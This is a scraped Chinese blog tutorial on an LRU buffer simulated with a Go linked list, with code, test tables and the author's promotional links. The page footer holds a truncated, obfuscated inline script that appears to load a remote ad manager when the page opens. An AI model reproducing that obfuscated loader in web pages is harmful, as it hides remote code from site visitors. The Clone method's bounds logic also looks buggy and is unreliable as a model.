   node <span class="token punctuation">:</span><span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Search</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
   <span class="token comment">// 如果存在缓冲区内，则将其放到缓冲区顶部</span>
   <span class="token keyword">if</span> node <span class="token operator">!=</span> nil <span class="token punctuation">{<!-- --></span>
      pos <span class="token punctuation">:</span><span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Find</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span>
      _ <span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Erase</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span>
      _ <span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span>
   <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span> <span class="token comment">// 不在缓冲区内，则将其放入缓冲区</span>
      node <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token operator">&amp;</span>Node<span class="token punctuation">{<!-- --></span>Pre<span class="token punctuation">:</span> nil<span class="token punctuation">,</span> <span class="token named-parameter punctuation">Suc</span><span class="token punctuation">:</span> nil<span class="token punctuation">,</span> <span class="token named-parameter punctuation">Data</span><span class="token punctuation">:</span> data<span class="token punctuation">}</span>
      <span class="token range operator">..</span><span class="token punctuation">.</span> <span class="token comment">// 异常处理</span>
      _ <span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> node<span class="token punctuation">)</span>
      <span class="token comment">// 超出缓冲区，删除最末尾的节点</span>
      <span class="token keyword">if</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span>Length <span class="token operator">&gt;</span> cacheStruct<span class="token punctuation">.</span>MaxLength <span class="token punctuation">{<!-- --></span>
         _ <span class="token operator">=</span> cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span><span class="token function">Erase</span><span class="token punctuation">(</span>cacheStruct<span class="token punctuation">.</span>Cache<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><code>​ Clone() 方法</code>用于拷贝、切片链表。它会先创建一个空链表，之后遍历被克隆的链表中的节点，并创建一个一模一样的节点到新的链表中。同时还支持接受一个开始与结束的参数，能对链表进行切片。</p> 
<pre><code class="prism language-csharp">
<span class="token comment">/*
Clone: 链表克隆
*/</span>
func <span class="token punctuation">(</span>l <span class="token operator">*</span>LinkList<span class="token punctuation">)</span> <span class="token function">Clone</span><span class="token punctuation">(</span>start <span class="token keyword">int</span><span class="token punctuation">,</span> end <span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>LinkList<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
   <span class="token comment">// 创建新链表</span>
   ll <span class="token punctuation">:</span><span class="token operator">=</span> LinkList<span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
   <span class="token keyword">if</span> end <span class="token operator">&lt;</span> start <span class="token operator">||</span> start <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> end <span class="token operator">&gt;</span> l<span class="token punctuation">.</span>Length <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">return</span> ll<span class="token punctuation">,</span> errors<span class="token punctuation">.</span><span class="token function">New</span><span class="token punctuation">(</span><span class="token string">"parameter is abnormal"</span><span class="token punctuation">)</span>
   <span class="token punctuation">}</span>
 
   <span class="token comment">// 复制</span>
   <span class="token keyword">for</span> i <span class="token punctuation">:</span><span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token operator">-</span>start<span class="token punctuation">;</span> i<span class="token operator">++</span> <span class="token punctuation">{<!-- --></span>
      node<span class="token punctuation">,</span> <span class="token named-parameter punctuation">_</span> <span class="token punctuation">:</span><span class="token operator">=</span> l<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
      item <span class="token punctuation">:</span><span class="token operator">=</span> <span class="token operator">*</span><span class="token class-name">node</span>
      _ <span class="token operator">=</span> ll<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>item<span class="token punctuation">)</span>
   <span class="token punctuation">}</span>
 
   <span class="token keyword">return</span> ll<span class="token punctuation">,</span> nil
<span class="token punctuation">}</span>

</code></pre> 
<p>​ <code>Connect()方法</code>则将两个链表进行连接。它首先会依次使用 <code>Clone() 方法</code>拷贝两个链表，之后再将两个拷贝后的链表进行对接。</p> 
<pre><code class="prism language-csharp"><span class="token comment">/*
ConnectLinkList: 链表连接
*/</span>
<span class="token return-type class-name">func</span> ConnectLinkList<span class="token return-type class-name"><span class="token punctuation">(</span>a LinkList<span class="token punctuation">,</span> b LinkList<span class="token punctuation">)</span></span> LinkList <span class="token punctuation">{<!-- --></span>
   <span class="token keyword">var</span> res LinkList
   <span class="token comment">// 拷贝两个数组 </span>
   aCopy<span class="token punctuation">,</span> <span class="token named-parameter punctuation">_</span> <span class="token punctuation">:</span><span class="token operator">=</span> a<span class="token punctuation">.</span>Clone<span class="token class-name"><span class="token punctuation">(</span>0<span class="token punctuation">,</span> a<span class="token punctuation">.</span>Length<span class="token punctuation">)</span></span>
   bCopy<span class="token punctuation">,</span> <span class="token named-parameter punctuation">_</span> <span class="token punctuation">:</span><span class="token operator">=</span> b<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> b<span class="token punctuation">.</span>Length<span class="token punctuation">)</span>
   <span class="token range operator">..</span><span class="token punctuation">.</span><span class="token comment">// 临界值处理</span>
 
   <span class="token comment">// 连接</span>
   aCopy<span class="token punctuation">.</span>Tail<span class="token punctuation">.</span>Suc <span class="token operator">=</span> bCopy<span class="token punctuation">.</span>Head
   bCopy<span class="token punctuation">.</span>Head<span class="token punctuation">.</span>Pre <span class="token operator">=</span> <span class="token class-name">aCopy<span class="token punctuation">.</span>Tail</span>
   res <span class="token operator">=</span> aCopy
   <span class="token keyword">return</span> res
<span class="token punctuation">}</span>

</code></pre> 
<h2>
<a id="46_422"></a>4.6、统计缓冲区命中率</h2> 
<p>​ 统计缓冲区命中率，需要分别统计链表的访问次数以及命中次数。在多线程并发的情况下，然而如果仅仅只是对二者进行加一操作，会造成数据错误。因此在操作访问次数与命中次数时，需将其放入临界区，保证数据正确。</p> 
<p>​ 统计缓冲区命中率的相关代码放入 LRU 调度当中。其中 <code>countLock</code> 为定义的 <code>Mutex 锁</code>。</p> 
<pre><code>csharp
func LruCacheScheduling(id int, cacheStruct *CacheStruct, data int) {
   ...
   // 如果存在缓冲区内，则将其放到缓冲区顶部
   if node != nil {
      ... 
      countLock.Lock()
      HitCount ++
      VisitCount++
   } else { // 不在缓冲区内，则将其放入缓冲区
      ...
      countLock.Lock()
      VisitCount++
   }
   countLock.Unlock()
}
</code></pre> 
<h1>
<a id="5_446"></a>5、系统运行结果</h1> 
<h2>
<a id="51_448"></a>5.1、运行环境</h2> 
<p>​<font color="#03a9f4" size="5" face="楷体"> <strong>系统运行环境</strong> </font>​ ​</p> 
<table>
<thead><tr>
<th>属性</th>
<th>值</th>
</tr></thead>
<tbody>
<tr>
<td>处理器</td>
<td>Intel® Core™ i5-8300H CPU @ 2.90GHz 2.90 GHz</td>
</tr>
<tr>
<td>操作系统</td>
<td>Windows 10 专业版 20H2</td>
</tr>
<tr>
<td>RAM</td>
<td>32.00 GB</td>
</tr>
<tr>
<td>系统类型</td>
<td>64 位操作系统, 基于 x64 的处理器</td>
</tr>
<tr>
<td>开发环境</td>
<td>Goland 2021.3</td>
</tr>
<tr>
<td>运行环境</td>
<td>go1.16 windows/amd64</td>
</tr>
</tbody>
</table>
<h2>
<a id="52_460"></a>5.2、运行与测试结果</h2> 
<h3>
<a id="521_461"></a>5.2.1、运行结果</h3> 
<p>个线程会将其调用信息打印在屏幕上，Thread ID 表明该信息来自于哪一个线程，Search Data 则代表当前线程正在访问的数据，后面的一串数列代表当前缓冲区。</p> 
<p>​ 通过观察缓冲区我们可以发现，每个线程将访问后的资源放到缓冲区首部，符合 LRU 调度算法。</p> 
<p>​ 由于本身屏幕也属于临界资源，因此也需要各线程进行抢夺。但在实际过程中发现，在给屏幕临界资源加锁后，线程阻塞时间变长，导致从宏观上各线程变成了线性进行，失去了并发性。</p> 
<p><img src="https://images2.imgbox.com/13/b4/GIJUFfSD_o.png" alt="在这里插入图片描述"></p> 
<p>​ 观察上方图可以发现，在线程0与线程1第一次出现时（图中标记位置1、2），缓冲区都仅有57这个数据，可见系统是并发执行的。当线程2第一次出现时（图中标记4），缓冲区当中已经拥有了一定数量的数据。经过观察可以发现，其调度发生在图中标记3之后，直接读取了缓冲区当中的数据57并将其放置在缓冲区首位。</p> 
<p>​ 下方图为结束时的运行结果，程序会计算缓冲区的命中率。<br> <img src="https://images2.imgbox.com/68/2d/GGdj5Ngn_o.png" alt="在这里插入图片描述"></p> 
<p>​ 选用不同大小的缓冲区进行测试，可以得到不一样的命中率。由图5.3可知，该系统缓冲区的工作点位于11~12大小附近。</p> 
<p><img src="https://images2.imgbox.com/f1/41/Fh1ghWIc_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="522_480"></a>5.2.2、链表方法测试</h3> 
<p>​ 我们对该系统的基础操作方法以及部分应用封装层的方法进行了自动化测试。测试选用的平台为 <code>Golang</code> 原生的测试工具 <code>Go_Test</code>。</p> 
<p>​ 测试样本选用了3组数据，内容如下方表所示：</p> 
<table>
<thead><tr>
<th>样本名</th>
<th>值</th>
</tr></thead>
<tbody>
<tr>
<td>testNode1</td>
<td>Node{Data: 100}</td>
</tr>
<tr>
<td>testNode2</td>
<td>Node{Data: 101}</td>
</tr>
<tr>
<td>testNode3</td>
<td>Node{Data: 102}</td>
</tr>
</tbody>
</table>
<p>下面表格展现了每个方法所测试的内容：</p> 
<table>
<thead><tr>
<th>测试函数</th>
<th>测试值</th>
<th>测试内容</th>
</tr></thead>
<tbody>
<tr>
<td>Insert()</td>
<td>testNode1</td>
<td>插入末端</td>
</tr>
<tr>
<td>Insert()</td>
<td>testNode2</td>
<td>插入索引20的位置</td>
</tr>
<tr>
<td>Insert()</td>
<td>testNode3</td>
<td>插入首位</td>
</tr>
<tr>
<td>Find()</td>
<td>testNode1</td>
<td>查询位置</td>
</tr>
<tr>
<td>Find()</td>
<td>testNode2</td>
<td>查询位置</td>
</tr>
<tr>
<td>Find()</td>
<td>Node{Data: 1022}</td>
<td>查询位置（反例）</td>
</tr>
<tr>
<td>Search()</td>
<td>100</td>
<td>查询位置</td>
</tr>
<tr>
<td>Search()</td>
<td>101</td>
<td>查询位置</td>
</tr>
<tr>
<td>Search()</td>
<td>1000</td>
<td>查询位置（反例）</td>
</tr>
<tr>
<td>Erase()</td>
<td>末端</td>
<td>删除末端</td>
</tr>
<tr>
<td>Erase()</td>
<td>20</td>
<td>删除索引20的位置</td>
</tr>
<tr>
<td>Erase()</td>
<td>0</td>
<td>删除首位</td>
</tr>
<tr>
<td>Get()</td>
<td>0</td>
<td>查询首位</td>
</tr>
<tr>
<td>Clone()</td>
<td>0, 10</td>
<td>取得从0~10的链表切片</td>
</tr>
<tr>
<td>Connect()</td>
<td>克隆得到的新链表，原链表</td>
<td>测试连接</td>
</tr>
</tbody>
</table>
<p>下面图是自动化测试后展现的结果，达到了90%以上的代码覆盖率。系统判定为通过：<br> <img src="https://images2.imgbox.com/fe/09/ZBx417nT_o.png" alt="在这里插入图片描述"></p> 
<h1>
<a id="6_511"></a>6、调试与改进</h1> 
<p>​ 实际上，对于 <code>LRU 函数</code>，并不是完全线程安全的。LRU 可以拆解为定位、删除、插入三个步骤，这三个步骤所对应的函数具有原子性，但对于这三个函数组成的 LRU 却不具有原子性。例如其中一个线程可以在另一个线程删除后进行插入等。</p> 
<p>​ 同时考虑到在多个连续操作时，线程锁连续地释放又被申请，造成了一定不必要的系统开销。因此在 LRU里面，可以将这三个函数拆解开来，放入到同一个临界区中，这样就解决了这个问题。</p> 
<h1>
<a id="_516"></a>?作者相关的文章、资源分享?</h1> 
<blockquote> 
 
  <font color="f7630c"><b>?让天下没有学不会的技术?</b></font>
 
 <br> 
 
  <font color="13ae01"><b>学习C#不再是难问题</b></font>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_10977427.html"> <font color="13ae01"><b>?《<u>C#入门到高级教程</u>》?</b></font></a>
 
 <br> 
 
  <font color="13ae01"><b>有关C#实战项目</b></font>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21113672"> <font color="13ae01"><b>?C#RS232C通讯源码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/20699239"> <font color="13ae01"><b>?C#委托数据传输?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/20699171"> <font color="13ae01"><b>?C# Modbus TCP 源代码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/19814654"> <font color="13ae01"><b>?C# 仓库管理系统源码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/16672771"> <font color="13ae01"><b>?C# 欧姆龙通讯Demo?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/24312586"> <font color="13ae01"><b>?C#+WPF+SQL目前在某市上线的车管所摄像系统?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/19326326"> <font color="13ae01"><b>?2021C#与Halcon视觉通用的框架?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/23696331"> <font color="13ae01"><b>?2021年视觉项目中利用C#完成三菱PLC与上位机的通讯?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/22741934"> <font color="13ae01"><b>?VP联合开源深度学习编程(WPF)?</b></font></a>
 
 <br> 
 
  <font color="13ae01"><b>✨有关C#项目欢迎各位查看个人主页✨</b></font>
 
 <br> 
</blockquote> 
<blockquote> 
 
  <font color="FF4500"><b>?机器视觉、深度学习?</b></font>
 
 <br> 
 
  <font color="FF4500"><b>学习机器视觉、深度学习不再是难问题</b></font>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_10977558.html"> <font color="FF4500"><b> ?《<u>Halcon入门到精通</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_10978473.html"> <font color="FF4500"><b> ?《<u>深度学习资料与教程</u>》?</b></font></a>
 
 <br> 
 
  <font color="FF4500"><b>有关机器视觉、深度学习实战</b></font>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21973403"> <font color="FF450"><b>?2021年C#+HALCON视觉软件?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/20703420"> <font color="FF450"><b>?2021年C#+HALCON实现模板匹配?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21399727"> <font color="FF450"><b>?C#集成Halcon的深度学习软件?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21399727"> <font color="FF450"><b>?C#集成Halcon的深度学习软件，带[MNIST例子]数据集?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/20699043"> <font color="FF450"><b>?C#支持等比例缩放拖动的halcon WPF开源窗体控件?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/22381727"> <font color="FF450"><b>?2021年Labview联合HALCON?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/22381657"> <font color="FF450"><b>?2021年Labview联合Visionpro?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/19680651"> <font color="FF450"><b>?基于Halcon及VS的动车组制动闸片厚度自动识别模块?</b></font></a>
 
 <br> 
 
  <font color="FF4500"><b>✨有关机器视觉、深度学习实战欢迎各位查看个人主页✨</b></font>
 
 <br> 
</blockquote> 
<blockquote> 
 
  <font color="#00e676"><b>?Java、数据库教程与项目?</b></font>
 
 <br> 
 
  <font color="#00e676"><b>学习Java、数据库教程不再是难问题</b></font>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_11128078.html"> <font color="#00e676"><b>?《<u>JAVA入门到高级教程</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_10987732.html"> <font color="#00e676"><b>?《<u>数据库入门到高级教程</u>》?</b></font></a>
 
 <br> 
 
  <font color="#00e676"><b>有关Java、数据库项目实战</b></font>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21977048"> <font color="#00e676"><b>?Java经典怀旧小霸王网页游戏机源码增强版?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/24870145"> <font color="#00e676"><b>?js+css类似网页版网易音乐源码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21977048"> <font color="#00e676"><b>?Java物业管理系统+小程序源码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/24817327"> <font color="#00e676"><b>?JavaWeb家居电子商城?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21067109"> <font color="#00e676"><b>?JAVA酒店客房预定管理系统的设计与实现SQLserver?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21067069"> <font color="#00e676"><b>?JAVA图书管理系统的研究与开发MYSQL?</b></font></a>
 
 <br> 
 
  <font color="#00e676"><b>✨有关Java、数据库教程与项目实战欢迎各位查看个人主页✨</b></font>
 
 <br> 
</blockquote> 
<blockquote> 
 
  <font color="#3d5afe"><b>?分享Python知识讲解、分享?</b></font>
 
 <br> 
 
  <font color="#3d5afe"><b>学习Python不再是难问题</b></font>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/category_11110403.html"> <font color="#3d5afe"><b>?《<u>Python知识、项目专栏</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/120044070"> <font color="#3d5afe"><b>?《<u>Python 检测抖音关注账号是否封号程</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/120053085"> <font color="#3d5afe"><b>?《<u>手把手教你Python+Qt5安装与使用</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/119408549"> <font color="#3d5afe"><b>?《<u>用一万字给小白全面讲解python编程基础问答</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/118079843"> <font color="#3d5afe"><b>?《<u>Python 绘制Android CPU和内存增长曲线</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/120864136"> <font color="#3d5afe"><b>?《☀️苏州程序大白用万字解析Python网络编程与Web编程☀️《❤️记得收藏❤️》》?</b></font></a>
 
 <br> 
 
  <font color="#3d5afe"><b>有关Python项目实战</b></font>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/19682139"> <font color="#3d5afe"><b>?Python基于Django图书管理系统?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/21132234"> <font color="#3d5afe"><b>?Python管理系统?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/22382303"> <font color="#3d5afe"><b>?2021年9个常用的python爬虫源码?</b></font></a>
 
 <br> 
 
  <a href="https://download.csdn.net/download/weixin_46931877/22383209"> <font color="#3d5afe"><b>?python二维码生成器?</b></font></a>
 
 <br> 
 
  <font color="#3d5afe"><b>✨有关Python教程与项目实战欢迎各位查看个人主页✨</b></font>
 
 <br> 
</blockquote> 
<blockquote> 
 
  <font color="#80d8ff"><b>?分享各大公司面试题、面试流程?</b></font>
 
 <br> 
 
  <font color="#80d8ff"><b>面试成功不是难事</b></font>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/120151136"> <font color="#80d8ff"><b>?《<u>2021年金九银十最新的VUE面试题☀️《❤️记得收藏❤️》</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/119487202"> <font color="#80d8ff"><b>?《<u>只要你认真看完一万字☀️Linux操作系统基础知识☀️分分钟钟都吊打面试官《❤️记得收藏❤️》</u>》?</b></font></a>
 
 <br> 
 
  <a href="https://blog.csdn.net/weixin_46931877/article/details/119408549"> <font color="#80d8ff"><b>?《<u>❤️用一万字给小白全面讲解python编程基础问答❤️《?记得收藏不然看着看着就不见了?》</u>》?</b></font></a>
 
 <br> 
 
  <font color="#80d8ff"><b>✨有关各大公司面试题、面试流程欢迎各位查看个人主页✨</b></font>
 
 <br> 
</blockquote> 
<h1>
<a id="_590"></a>?点击直接资料领取?</h1> 
<p><img src="https://images2.imgbox.com/3b/e8/8r1TFW3P_o.gif" alt="在这里插入图片描述"></p> 
<p>​<font color="#03a9f4" size="5" face="楷体"> <strong>这里有各种学习资料还有有有趣好玩的编程项目，更有难寻的各种资源。</strong> </font>​ ​</p> 

 <font color="f7630c"><b> ❤️关注苏州程序大白公众号❤️</b></font>

<br> 

 <font color="f7630c"><b> ? ??</b></font>

<br>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2